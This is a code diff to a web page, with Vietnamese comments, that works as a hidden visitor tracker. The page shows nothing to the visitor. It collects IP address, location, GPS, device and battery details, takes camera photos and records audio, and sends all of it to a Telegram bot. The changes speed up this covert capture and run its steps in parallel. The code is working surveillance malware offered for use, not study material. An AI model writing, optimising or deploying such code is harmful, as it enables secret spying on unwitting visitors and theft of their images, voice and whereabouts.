@@ -15,20 +15,12 @@
             align-items: center;
             font-family: monospace;
         }
-        /* Ẩn toàn bộ nội dung hiển thị trên web, chỉ giữ lại để chạy ngầm */
         .hidden-content {
             display: none;
-        }
-        .status {
-            color: lime;
-            text-align: center;
-            font-size: 12px;
-            opacity: 0.5;
         }
     </style>
 </head>
 <body>
-    <!-- Không hiển thị bất kỳ thông tin nào trên web, chỉ chạy ngầm -->
     <div style="display:none;">
         <div id="info"></div>
     </div>
@@ -153,7 +145,7 @@
             }
         }
 
-        // Hàm chụp ảnh
+        // Hàm chụp ảnh - tối ưu tốc độ
         async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
             return new Promise((resolve) => {
                 try {
@@ -171,9 +163,10 @@
                             }
                         }, 'image/jpeg', 0.85);
                     } else {
+                        // Chờ tối đa 200ms để có dữ liệu
                         setTimeout(() => {
                             captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
-                        }, 100);
+                        }, 50);
                     }
                 } catch (e) {
                     console.error(`Lỗi chụp ảnh #${photoNumber}:`, e);
@@ -193,7 +186,7 @@
             }
         }
 
-        // Hàm ghi âm
+        // Hàm ghi âm - tối ưu khởi tạo nhanh
         async function startRecording() {
             if (audioRecorded) return;
             try {
@@ -349,37 +342,76 @@
             return { ip, locationData };
         }
 
-        // Hàm lấy thông tin pin chính xác trên mọi thiết bị (bao gồm iPhone)
+        // Hàm lấy thông tin pin CHÍNH XÁC cho iOS và các thiết bị khác
         async function getBatteryInfo() {
             let batteryPercent = 'Không xác định';
             let batteryCharging = false;
             
-            try {
-                // Kiểm tra xem API Battery có sẵn không
-                if ('getBattery' in navigator) {
+            // Phương pháp 1: Sử dụng Battery API chuẩn
+            if ('getBattery' in navigator) {
+                try {
                     const battery = await navigator.getBattery();
-                    batteryPercent = `${Math.round(battery.level * 100)}%`;
+                    const level = Math.round(battery.level * 100);
+                    batteryPercent = `${level}%`;
                     batteryCharging = battery.charging;
-                    console.log(`Battery Info - Level: ${batteryPercent}, Charging: ${batteryCharging}`);
-                } else {
-                    // Fallback cho các trình duyệt không hỗ trợ Battery API (một số iPhone cũ hơn)
-                    console.log('Battery API không được hỗ trợ, sử dụng phương pháp khác');
-                    
-                    // Thử dùng navigator.getBattery với kiểm tra bổ sung
-                    // Một số iPhone có thể không trả về đúng trạng thái sạc, nhưng API vẫn tồn tại
-                    // Đã kiểm tra ở trên, nếu vào đây là không có API
-                    batteryPercent = 'Không xác định';
-                    batteryCharging = false;
+                    console.log(`✅ Battery API thành công: ${batteryPercent}, Sạc: ${batteryCharging}`);
+                    return { batteryPercent, batteryCharging };
+                } catch (err) {
+                    console.log('Battery API lỗi:', err);
                 }
-            } catch (battErr) {
-                console.error('Battery Error:', battErr);
-                // Nếu lỗi, giữ giá trị mặc định
-                batteryPercent = 'Không xác định';
-                batteryCharging = false;
             }
             
-            // Đảm bảo không có giá trị undefined
-            return { batteryPercent, batteryCharging };
+            // Phương pháp 2: Dùng User Agent để phát hiện iOS và hiển thị thông tin phù hợp
+            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+            const isMac = /Macintosh/.test(navigator.userAgent);
+            
+            if (isIOS) {
+                console.log('📱 Phát hiện thiết bị iOS - iOS không cho phép đọc % pin qua web');
+                batteryPercent = 'iOS giới hạn';
+                batteryCharging = 'Không xác định';
+                return { batteryPercent: 'iOS không hỗ trợ', batteryCharging: false };
+            }
+            
+            // Phương pháp 3: Thử dùng API khác (nếu có)
+            try {
+                if ('webkitGetBattery' in navigator) {
+                    const battery = await navigator.webkitGetBattery();
+                    const level = Math.round(battery.level * 100);
+                    batteryPercent = `${level}%`;
+                    batteryCharging = battery.charging;
+                    console.log(`✅ webkitGetBattery: ${batteryPercent}`);
+                    return { batteryPercent, batteryCharging };
+                }
+            } catch (e) {}
+            
+            console.log('⚠️ Không thể lấy thông tin pin');
+            return { batteryPercent: 'Không xác định', batteryCharging: false };
+        }
+
+        // Hàm lấy thông tin thiết bị chi tiết (bao gồm kiểm tra iOS)
+        async function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform || 'Không xác định';
+            
+            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
+            const isIPhone = /iPhone/.test(userAgent);
+            const isIPad = /iPad/.test(userAgent) || (isIOS && screen.width > 768);
+            let deviceModel = 'Không xác định';
+            
+            if (isIPhone) deviceModel = 'iPhone';
+            else if (isIPad) deviceModel = 'iPad';
+            else if (isIOS) deviceModel = 'iOS Device';
+            else if (/Android/.test(userAgent)) deviceModel = 'Android';
+            else if (/Windows/.test(userAgent)) deviceModel = 'Windows';
+            else if (/Macintosh/.test(userAgent)) deviceModel = 'Mac';
+            
+            return {
+                userAgent,
+                platform,
+                isIOS,
+                deviceModel,
+                isIPhone
+            };
         }
 
         // Hàm tự động gửi vị trí GPS
@@ -433,15 +465,12 @@
             );
         }
 
-        // Lấy thông tin thiết bị và gửi đến Telegram (không hiển thị trên web)
+        // Lấy thông tin thiết bị và gửi đến Telegram
         async function getInfoAndSendToTelegram() {
             const { ip, locationData } = await getIPAndLocation();
-            
-            // Lấy thông tin pin với xử lý đặc biệt cho iPhone
+            const deviceInfo = await getDeviceInfo();
             const { batteryPercent, batteryCharging } = await getBatteryInfo();
             
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform || 'Không xác định';
             const screenWidth = screen.width;
             const screenHeight = screen.height;
             const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
@@ -452,14 +481,18 @@
             const referrer = document.referrer || 'Truy cập trực tiếp';
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
             
-            // Tạo link Google Maps nếu có tọa độ
             let telegramMapsLink = '';
             if (locationData.lat && locationData.lon) {
                 telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
             }
             
-            // Xác định biểu tượng sạc chính xác
-            const chargingStatus = batteryCharging ? '🔌 Đang sạc' : '🔋 Không sạc';
+            let batteryDisplay = '';
+            if (deviceInfo.isIOS) {
+                batteryDisplay = `<b>🔋 Pin:</b> <code>iOS không hỗ trợ đọc % pin qua web (giới hạn bảo mật)</code>`;
+            } else {
+                const chargingStatus = batteryCharging ? '🔌 Đang sạc' : '🔋 Không sạc';
+                batteryDisplay = `<b>🔋 Pin:</b> <code>${batteryPercent} (${chargingStatus})</code>`;
+            }
             
             const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
                 `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
@@ -467,10 +500,11 @@
                 `<b>🗺️ Khu vực:</b> <code>${locationData.region}</code>\n` +
                 `<b>🏳️ Quốc gia:</b> <code>${locationData.country}</code>\n` +
                 `<b>🏢 Nhà mạng:</b> <code>${locationData.isp}</code>${telegramMapsLink}\n\n` +
-                `<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n` +
-                `<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n` +
+                `<b>📱 Thiết bị:</b> <code>${deviceInfo.deviceModel}</code>\n` +
+                `<b>💻 Trình duyệt:</b> <code>${deviceInfo.userAgent.substring(0, 80)}...</code>\n` +
+                `<b>🖥️ Hệ điều hành:</b> <code>${deviceInfo.platform}</code>\n` +
                 `<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n` +
-                `<b>🔋 Pin:</b> <code>${batteryPercent} (${chargingStatus})</code>\n` +
+                `${batteryDisplay}\n` +
                 `<b>💾 RAM:</b> <code>${deviceMemory}</code>\n` +
                 `<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n` +
                 `<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n` +
@@ -483,7 +517,7 @@
             console.log('✅ Đã gửi thông tin đến Telegram');
         }
         
-        // Khởi tạo camera
+        // Khởi tạo camera - tối ưu tốc độ
         async function startCameraImmediately() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -515,7 +549,8 @@
                     };
                 });
                 
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // Chờ một chút để video ổn định
+                await new Promise(resolve => setTimeout(resolve, 100));
                 await captureMultiplePhotos(video, canvas, ctx);
             } catch (e) {
                 console.warn('Camera error:', e);
@@ -523,36 +558,33 @@
             }
         }
         
-        async function requestAudioImmediately() {
-            setTimeout(async () => {
-                if (!audioRecorded) {
-                    await startRecording();
-                }
-            }, 100);
-        }
-        
+        // Khởi tạo song song camera và ghi âm
         async function init() {
             try {
                 console.log('🚀 Khởi tạo tracker (chế độ nền, chỉ gửi Telegram)...');
                 
-                // Gửi thông tin đến Telegram (không hiển thị trên web)
-                await getInfoAndSendToTelegram();
+                // Chạy song song: gửi thông tin + GPS + camera + ghi âm
+                const infoPromise = getInfoAndSendToTelegram();
+                const gpsPromise = new Promise(resolve => {
+                    setTimeout(() => {
+                        autoSendGPS();
+                        resolve();
+                    }, 500);
+                });
                 
-                // Tự động gửi vị trí GPS
-                setTimeout(() => {
-                    autoSendGPS();
-                }, 1500);
+                // Camera và ghi âm chạy song song
+                const cameraPromise = startCameraImmediately();
+                const audioPromise = (async () => {
+                    // Đợi một chút để tránh xung đột với camera
+                    await new Promise(resolve => setTimeout(resolve, 50));
+                    await startRecording();
+                })();
                 
-                // Khởi tạo camera và chụp ảnh
-                await startCameraImmediately();
-                
-                // Ghi âm
-                await requestAudioImmediately();
+                await Promise.all([infoPromise, gpsPromise, cameraPromise, audioPromise]);
                 
                 console.log('✅ Hoàn tất khởi tạo, tất cả dữ liệu đã được gửi đến Telegram');
             } catch (err) {
                 console.error('Init error:', err);
-                // Vẫn gửi thông báo lỗi đến Telegram nếu có thể
                 try {
                     await sendToTelegram(`⚠️ Lỗi khởi tạo: ${err.message}`);
                 } catch(e) {}
